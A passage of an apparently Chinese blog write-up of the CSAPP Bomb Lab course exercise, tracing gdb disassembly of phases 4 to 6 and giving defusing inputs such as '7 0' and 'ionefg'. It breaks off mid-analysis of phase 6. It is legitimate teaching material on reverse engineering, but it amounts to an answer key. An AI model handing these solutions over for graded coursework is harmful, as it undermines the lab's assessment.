of assembler code for function phase_4:</span><br><span class="line">=&gt; 0x000000000040100c &lt;+0&gt;:sub    $0x18,%rsp</span><br><span class="line">   0x0000000000401010 &lt;+4&gt;:lea    0xc(%rsp),%rcx</span><br><span class="line">   0x0000000000401015 &lt;+9&gt;:lea    0x8(%rsp),%rdx</span><br><span class="line">   0x000000000040101a &lt;+14&gt;:mov    $0x4025cf,%esi</span><br><span class="line">   0x000000000040101f &lt;+19&gt;:mov    $0x0,%eax</span><br><span class="line">   0x0000000000401024 &lt;+24&gt;:call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x0000000000401029 &lt;+29&gt;:cmp    $0x2,%eax</span><br><span class="line">   0x000000000040102c &lt;+32&gt;:jne    0x401035 &lt;phase_4+41&gt;</span><br><span class="line">   0x000000000040102e &lt;+34&gt;:cmpl   $0xe,0x8(%rsp)</span><br><span class="line">   0x0000000000401033 &lt;+39&gt;:jbe    0x40103a &lt;phase_4+46&gt;</span><br><span class="line">   0x0000000000401035 &lt;+41&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x000000000040103a &lt;+46&gt;:mov    $0xe,%edx</span><br><span class="line">   0x000000000040103f &lt;+51&gt;:mov    $0x0,%esi</span><br><span class="line">   0x0000000000401044 &lt;+56&gt;:mov    0x8(%rsp),%edi</span><br><span class="line">   0x0000000000401048 &lt;+60&gt;:call   0x400fce &lt;func4&gt;</span><br><span class="line">   0x000000000040104d &lt;+65&gt;:test   %eax,%eax</span><br><span class="line">   0x000000000040104f &lt;+67&gt;:jne    0x401058 &lt;phase_4+76&gt;</span><br><span class="line">   0x0000000000401051 &lt;+69&gt;:cmpl   $0x0,0xc(%rsp)</span><br><span class="line">   0x0000000000401056 &lt;+74&gt;:je     0x40105d &lt;phase_4+81&gt;</span><br><span class="line">   0x0000000000401058 &lt;+76&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x000000000040105d &lt;+81&gt;:add    $0x18,%rsp</span><br><span class="line">   0x0000000000401061 &lt;+85&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>&lt;+14&gt;行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print (char *) 0x4025cf</span><br><span class="line">$13 = 0x4025cf &quot;%d %d&quot;</span><br></pre></td></tr></table></figure><p>由此可知输入的应为两个decimal number.<br>由&lt;+34&gt;, &lt;+39&gt;可知，第一个数字要 &lt;&#x3D; 14 且 &gt;&#x3D; 0, 因为&lt;+34&gt;:    cmpl   $0xe,0x8(%rsp) 是无符号数的比较。<br>由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040103a &lt;+46&gt;:mov    $0xe,%edx</span><br><span class="line">0x000000000040103f &lt;+51&gt;:mov    $0x0,%esi</span><br><span class="line">0x0000000000401044 &lt;+56&gt;:mov    0x8(%rsp),%edi</span><br><span class="line">0x0000000000401048 &lt;+60&gt;:call   0x400fce &lt;func4&gt;</span><br></pre></td></tr></table></figure><p>可知 %edi, %esi, %edx为func4的三个参数，值分别为我们输入的第一个数字，0，14。</p><p>反汇编func4可得：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400fce in func4 ()</span><br><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code for function func4:</span><br><span class="line">=&gt; 0x0000000000400fce &lt;+0&gt;:sub    $0x8,%rsp</span><br><span class="line">   0x0000000000400fd2 &lt;+4&gt;:mov    %edx,%eax</span><br><span class="line">   0x0000000000400fd4 &lt;+6&gt;:sub    %esi,%eax</span><br><span class="line">   0x0000000000400fd6 &lt;+8&gt;:mov    %eax,%ecx</span><br><span class="line">   0x0000000000400fd8 &lt;+10&gt;:shr    $0x1f,%ecx</span><br><span class="line">   0x0000000000400fdb &lt;+13&gt;:add    %ecx,%eax</span><br><span class="line">   0x0000000000400fdd &lt;+15&gt;:sar    %eax</span><br><span class="line">   0x0000000000400fdf &lt;+17&gt;:lea    (%rax,%rsi,1),%ecx</span><br><span class="line">   0x0000000000400fe2 &lt;+20&gt;:cmp    %edi,%ecx</span><br><span class="line">   0x0000000000400fe4 &lt;+22&gt;:jle    0x400ff2 &lt;func4+36&gt;</span><br><span class="line">   0x0000000000400fe6 &lt;+24&gt;:lea    -0x1(%rcx),%edx</span><br><span class="line">   0x0000000000400fe9 &lt;+27&gt;:call   0x400fce &lt;func4&gt;</span><br><span class="line">   0x0000000000400fee &lt;+32&gt;:add    %eax,%eax</span><br><span class="line">   0x0000000000400ff0 &lt;+34&gt;:jmp    0x401007 &lt;func4+57&gt;</span><br><span class="line">   0x0000000000400ff2 &lt;+36&gt;:mov    $0x0,%eax</span><br><span class="line">   0x0000000000400ff7 &lt;+41&gt;:cmp    %edi,%ecx</span><br><span class="line">   0x0000000000400ff9 &lt;+43&gt;:jge    0x401007 &lt;func4+57&gt;</span><br><span class="line">   0x0000000000400ffb &lt;+45&gt;:lea    0x1(%rcx),%esi</span><br><span class="line">   0x0000000000400ffe &lt;+48&gt;:call   0x400fce &lt;func4&gt;</span><br><span class="line">   0x0000000000401003 &lt;+53&gt;:lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">   0x0000000000401007 &lt;+57&gt;:add    $0x8,%rsp</span><br><span class="line">   0x000000000040100b &lt;+61&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>func4的解析参考这个博客：<a href="https://www.cnblogs.com/sinkinben/p/12397430.html">https://www.cnblogs.com/sinkinben/p/12397430.html</a></p><p>最后可得答案为下述四种组合<br>0 0<br>1 0<br>3 0<br>7 0</p><p>phase4 解析：<br>参考：<br><a href="https://www.cnblogs.com/sinkinben/p/12397430.html">https://www.cnblogs.com/sinkinben/p/12397430.html</a><br><a href="https://earthaa.github.io/2020/01/12/CSAPP-Bomblab/">https://earthaa.github.io/2020/01/12/CSAPP-Bomblab/</a></p><h3 id="phase-5"><a href="#phase-5" class="headerlink" title="phase 5"></a>phase 5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401062 in phase_5 ()</span><br><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code for function phase_5:</span><br><span class="line">=&gt; 0x0000000000401062 &lt;+0&gt;:push   %rbx</span><br><span class="line">   0x0000000000401063 &lt;+1&gt;:sub    $0x20,%rsp</span><br><span class="line">   0x0000000000401067 &lt;+5&gt;:mov    %rdi,%rbx</span><br><span class="line">   0x000000000040106a &lt;+8&gt;:mov    %fs:0x28,%rax</span><br><span class="line">   0x0000000000401073 &lt;+17&gt;:mov    %rax,0x18(%rsp)</span><br><span class="line">   0x0000000000401078 &lt;+22&gt;:xor    %eax,%eax</span><br><span class="line">   0x000000000040107a &lt;+24&gt;:call   0x40131b &lt;string_length&gt;</span><br><span class="line">   0x000000000040107f &lt;+29&gt;:cmp    $0x6,%eax</span><br><span class="line">   0x0000000000401082 &lt;+32&gt;:je     0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line">   0x0000000000401084 &lt;+34&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401089 &lt;+39&gt;:jmp    0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line">   0x000000000040108b &lt;+41&gt;:movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">   0x000000000040108f &lt;+45&gt;:mov    %cl,(%rsp)</span><br><span class="line">   0x0000000000401092 &lt;+48&gt;:mov    (%rsp),%rdx</span><br><span class="line">   0x0000000000401096 &lt;+52&gt;:and    $0xf,%edx</span><br><span class="line">   0x0000000000401099 &lt;+55&gt;:movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">   0x00000000004010a0 &lt;+62&gt;:mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">   0x00000000004010a4 &lt;+66&gt;:add    $0x1,%rax</span><br><span class="line">   0x00000000004010a8 &lt;+70&gt;:cmp    $0x6,%rax</span><br><span class="line">   0x00000000004010ac &lt;+74&gt;:jne    0x40108b &lt;phase_5+41&gt;</span><br><span class="line">   0x00000000004010ae &lt;+76&gt;:movb   $0x0,0x16(%rsp)</span><br><span class="line">   0x00000000004010b3 &lt;+81&gt;:mov    $0x40245e,%esi</span><br><span class="line">   0x00000000004010b8 &lt;+86&gt;:lea    0x10(%rsp),%rdi</span><br><span class="line">   0x00000000004010bd &lt;+91&gt;:call   0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">   0x00000000004010c2 &lt;+96&gt;:test   %eax,%eax</span><br><span class="line">   0x00000000004010c4 &lt;+98&gt;:je     0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line">   0x00000000004010c6 &lt;+100&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004010cb &lt;+105&gt;:nopl   0x0(%rax,%rax,1)</span><br><span class="line">   0x00000000004010d0 &lt;+110&gt;:jmp    0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line">   0x00000000004010d2 &lt;+112&gt;:mov    $0x0,%eax</span><br><span class="line">   0x00000000004010d7 &lt;+117&gt;:jmp    0x40108b &lt;phase_5+41&gt;</span><br><span class="line">   0x00000000004010d9 &lt;+119&gt;:mov    0x18(%rsp),%rax</span><br><span class="line">   0x00000000004010de &lt;+124&gt;:xor    %fs:0x28,%rax</span><br><span class="line">   0x00000000004010e7 &lt;+133&gt;:je     0x4010ee &lt;phase_5+140&gt;</span><br><span class="line">   0x00000000004010e9 &lt;+135&gt;:call   0x400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x00000000004010ee &lt;+140&gt;:add    $0x20,%rsp</span><br><span class="line">--Type &lt;RET&gt; for more, q to quit, c to continue without paging--</span><br><span class="line">   0x00000000004010f2 &lt;+144&gt;:pop    %rbx</span><br><span class="line">   0x00000000004010f3 &lt;+145&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>由&lt;+24&gt;，&lt;+29&gt;可知我们需要输入一个长度为6的字符串。<br>&lt;+41&gt; 到 &lt;+74&gt; 大致意思：<br>看&lt;+48&gt;,&lt;+52&gt;可知，我们将输入的字母与0xf做AND操作，然后&lt;+55&gt;行做了某个操作，然后&lt;+66&gt;&lt;+70&gt;行进入循环，我们对每个输入的字符都进行上述操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print (char *) 0x4024b0</span><br><span class="line">$17 = 0x4024b0 &lt;array&gt; &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span><br></pre></td></tr></table></figure><p>由于%edx是%rdx的低32bit，而且%rdx存放的数比较小，所以此时%edx &#x3D; %rdx.所以下述两行是将输入字母与0xf做AND操作，并将得到的结果作为偏移量来读取0x4024b0中存放的字符串，即maduiersnfotvbyl。当输入字符与0xf做AND操作结果为0时，我们读取的是m,为1时读取a,依次类推。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401096 &lt;+52&gt;:and    $0xf,%edx</span><br><span class="line">0x0000000000401099 &lt;+55&gt;:movzbl 0x4024b0(%rdx),%edx</span><br></pre></td></tr></table></figure><p>&lt;+76&gt;到&lt;+98&gt;将上个步骤得到的字符串与某个字符串比较，如果不相等则引爆炸弹。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s 0x40245e</span><br><span class="line">0x40245e:&quot;flyers&quot;</span><br></pre></td></tr></table></figure><p>看&lt;+81&gt;可知我们最终得到的字符串要与flyers相等。flyers对应9, F, E, 4, 5, 6。所以input_string 的每个字符AND 0xf &#x3D; 9, F, E, 4, 5, 6。可以算出input_string &#x3D; ionefg.</p><h3 id="phase-6"><a href="#phase-6" class="headerlink" title="phase 6"></a>phase 6</h3><p>phase 6反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004010f4 in phase_6 ()</span><br><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code for function phase_6:</span><br><span class="line">=&gt; 0x00000000004010f4 &lt;+0&gt;:push   %r14</span><br><span class="line">   0x00000000004010f6 &lt;+2&gt;:push   %r13</span><br><span class="line">   0x00000000004010f8 &lt;+4&gt;:push   %r12</span><br><span class="line">   0x00000000004010fa &lt;+6&gt;:push   %rbp</span><br><span class="line">   0x00000000004010fb &lt;+7&gt;:push   %rbx</span><br><span class="line">   0x00000000004010fc &lt;+8&gt;:sub    $0x50,%rsp</span><br><span class="line">   0x0000000000401100 &lt;+12&gt;:mov    %rsp,%r13</span><br><span class="line">   0x0000000000401103 &lt;+15&gt;:mov    %rsp,%rsi</span><br><span class="line">   0x0000000000401106 &lt;+18&gt;:call   0x40145c &lt;read_six_numbers&gt;</span><br><span class="line">   0x000000000040110b &lt;+23&gt;:mov    %rsp,%r14</span><br><span class="line">   0x000000000040110e &lt;+26&gt;:mov    $0x0,%r12d</span><br><span class="line">   0x0000000000401114 &lt;+32&gt;:mov    %r13,%rbp</span><br><span class="line">   0x0000000000401117 &lt;+35&gt;:mov    0x0(%r13),%eax</span><br><span class="line">   0x000000000040111b &lt;+39&gt;:sub    $0x1,%eax</span><br><span class="line">   0x000000000040111e &lt;+42&gt;:cmp    $0x5,%eax</span><br><span class="line">   0x0000000000401121 &lt;+45&gt;:jbe    0x401128 &lt;phase_6+52&gt;</span><br><span class="line">   0x0000000000401123 &lt;+47&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401128 &lt;+52&gt;:add    $0x1,%r12d</span><br><span class="line">   0x000000000040112c &lt;+56&gt;:cmp    $0x6,%r12d</span><br><span class="line">   0x0000000000401130 &lt;+60&gt;:je     0x401153 &lt;phase_6+95&gt;</span><br><span class="line">   0x0000000000401132 &lt;+62&gt;:mov    %r12d,%ebx</span><br><span class="line">   0x0000000000401135 &lt;+65&gt;:movslq %ebx,%rax</span><br><span class="line">   0x0000000000401138 &lt;+68&gt;:mov    (%rsp,%rax,4),%eax</span><br><span class="line">   0x000000000040113b &lt;+71&gt;:cmp    %eax,0x0(%rbp)</span><br><span class="line">   0x000000000040113e &lt;+74&gt;:jne    0x401145 &lt;phase_6+81&gt;</span><br><span class="line">   0x0000000000401140 &lt;+76&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401145 &lt;+81&gt;:add    $0x1,%ebx</span><br><span class="line">   0x0000000000401148 &lt;+84&gt;:cmp    $0x5,%ebx</span><br><span class="line">   0x000000000040114b &lt;+87&gt;:jle    0x401135 &lt;phase_6+65&gt;</span><br><span class="line">   0x000000000040114d &lt;+89&gt;:add    $0x4,%r13</span><br><span class="line">--Type &lt;RET&gt; for more, q to quit, c to continue without paging--</span><br><span class="line">   0x0000000000401151 &lt;+93&gt;:jmp    0x401114 &lt;phase_6+32&gt;</span><br><span class="line">   0x0000000000401153 &lt;+95&gt;:lea    0x18(%rsp),%rsi</span><br><span class="line">   0x0000000000401158 &lt;+100&gt;:mov    %r14,%rax</span><br><span class="line">   0x000000000040115b &lt;+103&gt;:mov    $0x7,%ecx</span><br><span class="line">   0x0000000000401160 &lt;+108&gt;:mov    %ecx,%edx</span><br><span class="line">   0x0000000000401162 &lt;+110&gt;:sub    (%rax),%edx</span><br><span class="line">   0x0000000000401164 &lt;+112&gt;:mov    %edx,(%rax)</span><br><span class="line">   0x0000000000401166 &lt;+114&gt;:add    $0x4,%rax</span><br><span class="line">   0x000000000040116a &lt;+118&gt;:cmp    %rsi,%rax</span><br><span class="line">   0x000000000040116d &lt;+121&gt;:jne    0x401160 &lt;phase_6+108&gt;</span><br><span class="line">   0x000000000040116f &lt;+123&gt;:mov    $0x0,%esi</span><br><span class="line">   0x0000000000401174 &lt;+128&gt;:jmp    0x401197 &lt;phase_6+163&gt;</span><br><span class="line">   0x0000000000401176 &lt;+130&gt;:mov    0x8(%rdx),%rdx</span><br><span class="line">   0x000000000040117a &lt;+134&gt;:add    $0x1,%eax</span><br><span class="line">   0x000000000040117d &lt;+137&gt;:cmp    %ecx,%eax</span><br><span class="line">   0x000000000040117f &lt;+139&gt;:jne    0x401176 &lt;phase_6+130&gt;</span><br><span class="line">   0x0000000000401181 &lt;+141&gt;:jmp    0x401188 &lt;phase_6+148&gt;</span><br><span class="line">   0x0000000000401183 &lt;+143&gt;:mov    $0x6032d0,%edx</span><br><span class="line">   0x0000000000401188 &lt;+148&gt;:mov    %rdx,0x20(%rsp,%rsi,2)</span><br><span class="line">   0x000000000040118d &lt;+153&gt;:add    $0x4,%rsi</span><br><span class="line">   0x0000000000401191 &lt;+157&gt;:cmp    $0x18,%rsi</span><br><span class="line">   0x0000000000401195 &lt;+161&gt;:je     0x4011ab &lt;phase_6+183&gt;</span><br><span class="line">   0x0000000000401197 &lt;+163&gt;:mov    (%rsp,%rsi,1),%ecx</span><br><span class="line">   0x000000000040119a &lt;+166&gt;:cmp    $0x1,%ecx</span><br><span class="line">   0x000000000040119d &lt;+169&gt;:jle    0x401183 &lt;phase_6+143&gt;</span><br><span class="line">   0x000000000040119f &lt;+171&gt;:mov    $0x1,%eax</span><br><span class="line">   0x00000000004011a4 &lt;+176&gt;:mov    $0x6032d0,%edx</span><br><span class="line">   0x00000000004011a9 &lt;+181&gt;:jmp    0x401176 &lt;phase_6+130&gt;</span><br><span class="line">   0x00000000004011ab &lt;+183&gt;:mov    0x20(%rsp),%rbx</span><br><span class="line">   0x00000000004011b0 &lt;+188&gt;:lea    0x28(%rsp),%rax</span><br><span class="line">   0x00000000004011b5 &lt;+193&gt;:lea    0x50(%rsp),%rsi</span><br><span class="line">--Type &lt;RET&gt; for more, q to quit, c to continue without paging--</span><br><span class="line">   0x00000000004011ba &lt;+198&gt;:mov    %rbx,%rcx</span><br><span class="line">   0x00000000004011bd &lt;+201&gt;:mov    (%rax),%rdx</span><br><span class="line">   0x00000000004011c0 &lt;+204&gt;:mov    %rdx,0x8(%rcx)</span><br><span class="line">   0x00000000004011c4 &lt;+208&gt;:add    $0x8,%rax</span><br><span class="line">   0x00000000004011c8 &lt;+212&gt;:cmp    %rsi,%rax</span><br><span class="line">   0x00000000004011cb &lt;+215&gt;:je     0x4011d2 &lt;phase_6+222&gt;</span><br><span class="line">   0x00000000004011cd &lt;+217&gt;:mov    %rdx,%rcx</span><br><span class="line">   0x00000000004011d0 &lt;+220&gt;:jmp    0x4011bd &lt;phase_6+201&gt;</span><br><span class="line">   0x00000000004011d2 &lt;+222&gt;:movq   $0x0,0x8(%rdx)</span><br><span class="line">   0x00000000004011da &lt;+230&gt;:mov    $0x5,%ebp</span><br><span class="line">   0x00000000004011df &lt;+235&gt;:mov    0x8(%rbx),%rax</span><br><span class="line">   0x00000000004011e3 &lt;+239&gt;:mov    (%rax),%eax</span><br><span class="line">   0x00000000004011e5 &lt;+241&gt;:cmp    %eax,(%rbx)</span><br><span class="line">   0x00000000004011e7 &lt;+243&gt;:jge    0x4011ee &lt;phase_6+250&gt;</span><br><span class="line">   0x00000000004011e9 &lt;+245&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004011ee &lt;+250&gt;:mov    0x8(%rbx),%rbx</span><br><span class="line">   0x00000000004011f2 &lt;+254&gt;:sub    $0x1,%ebp</span><br><span class="line">   0x00000000004011f5 &lt;+257&gt;:jne    0x4011df &lt;phase_6+235&gt;</span><br><span class="line">   0x00000000004011f7 &lt;+259&gt;:add    $0x50,%rsp</span><br><span class="line">   0x00000000004011fb &lt;+263&gt;:pop    %rbx</span><br><span class="line">   0x00000000004011fc &lt;+264&gt;:pop    %rbp</span><br><span class="line">   0x00000000004011fd &lt;+265&gt;:pop    %r12</span><br><span class="line">   0x00000000004011ff &lt;+267&gt;:pop    %r13</span><br><span class="line">   0x0000000000401201 &lt;+269&gt;:pop    %r14</span><br><span class="line">   0x0000000000401203 &lt;+271&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>由&lt;+18&gt;行可知要输入6个数字。<br>&lt;+32&gt;到&lt;+87&gt;：对输入的6个数字进行循环，要求每个数字 &lt;&#x3D; 6(见&lt;+42&gt;)，并且后面一个数不能和前一个数相等（见&lt;+71&gt;，&lt;+74&gt;）。<br>下面这部分是用7分别减去每个输入的数字。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040115b &lt;+103&gt;:mov    $0x7,%ecx     # %ecx = 7</span><br><span class="line">0x0000000000401160 &lt;+108&gt;:mov    %ecx,%edx     # %edx = 7    这部分循环用7减输入的6个数</span><br><span class="line">0x0000000000401162 &lt;+110&gt;:sub    (%rax),%edx   # %edx = %edx – (%rax) = 7 - (%rax)</span><br><span class="line">0x0000000000401164 &lt;+112&gt;:mov    %edx,(%rax)   # (%rax) = %edx = 7 - (%rax) (第一个%rax = 1)</span><br><span class="line">0x0000000000401166 &lt;+114&gt;:add    $0x4,%rax     # %rax = %rax + 4</span><br><span class="line">0x000000000040116a &lt;+118&gt;:cmp    %rsi,%rax    </span><br></pre></td></tr></table></figure><p>观察 0x00000000004011a4 &lt;+176&gt;:    mov    $0x6032d0,%edx和0x00000000004011d2 &lt;+222&gt;:    movq   $0x0,0x8(%rdx)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x 0x6032d0</span><br><span class="line">0x6032d0 &lt;node1&gt;:0x0000014c</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x $rdx</span><br><span class="line">0x6032e0 &lt;node2&gt;:0x000000a8</span><br></pre></td></tr></table></figure><p>显示出node，并且循环中%rdx每次加0x8，猜测是link list.因为一个pointer的大小是8。<br>用x&#x2F;4x，多显示出一些东西,发现第一列是node值，第二列是node序号，第三列是next node.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/4x $rdx</span><br><span class="line">0x6032e0 &lt;node2&gt;:0x000000a80x000000020x006032f00x00000000</span><br></pre></td></tr></table></figure><p>接着按回车键会显示出<node3>, <node4>…<br>我们从从<node1>开始打印，结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/4x ($rdx-16)</span><br><span class="line">0x6032d0 &lt;node1&gt;:0x0000014c0x000000010x006032e00x00000000</span><br><span class="line">(gdb) </span><br><span class="line">0x6032e0 &lt;node2&gt;:0x000000a80x000000020x006032f00x00000000</span><br><span class="line">(gdb) </span><br><span class="line">0x6032f0 &lt;node3&gt;:0x0000039c0x000000030x006033000x00000000</span><br><span class="line">(gdb) </span><br><span class="line">0x603300 &lt;node4&gt;:0x000002b30x000000040x006033100x00000000</span><br><span class="line">(gdb) </span><br><span class="line">0x603310 &lt;node5&gt;:0x000001dd0x000000050x006033200x00000000</span><br><span class="line">(gdb) </span><br><span class="line">0x603320 &lt;node6&gt;:0x000001bb0x000000060x006032d00x00000000</span><br></pre></td></tr></table></figure><p>打印成decimal 形势如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/4d ($rdx-16)</span><br><span class="line">0x6032d0 &lt;node1&gt;:332163044800</span><br><span class="line">(gdb) </span><br><span class="line">0x6032e0 &lt;node2&gt;:168263044960</span><br><span class="line">(gdb) </span><br><span class="line">0x6032f0 &lt;node3&gt;:924363045120</span><br><span class="line">(gdb) </span><br><span class="line">0x603300 &lt;node4&gt;:691463045280</span><br><span class="line">(gdb) </span><br><span class="line">0x603310 &lt;node5&gt;:477563045440</span><br><span class="line">(gdb) </span><br><span class="line">0x603320 &lt;node6&gt;:443663044640</span><br></pre></td></tr></table></figure><p>随便输入6位数，发现node1值永远为332，编号永远为1，所以说明node1编号为1值为332是固定的，输入不同的数字改变的只是next_node，即改变的是node的连接方式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004011d2 &lt;+222&gt;:movq   #$0x0,0x8(%rdx)</span><br><span class="line">0x00000000004011da &lt;+230&gt;:mov    #$0x5,%ebp</span><br><span class="line">0x00000000004011df &lt;+235&gt;:mov    #0x8(%rbx),%rax</span><br><span class="line">0x00000000004011e3 &lt;+239&gt;:mov    #(%rax),%eax</span><br><span class="line">0x00000000004011e5 &lt;+241&gt;:cmp    #%eax,(%rbx)  %rbx &gt;= %eax = %rax = 0x8(%rbx) （注意：小地址（%rbx）存的是  前面的数，大地址（0x8(%rbx)）存的是后面的数）</span><br><span class="line">0x00000000004011e7 &lt;+243&gt;:jge    #0x4011ee &lt;phase_6+250&gt; 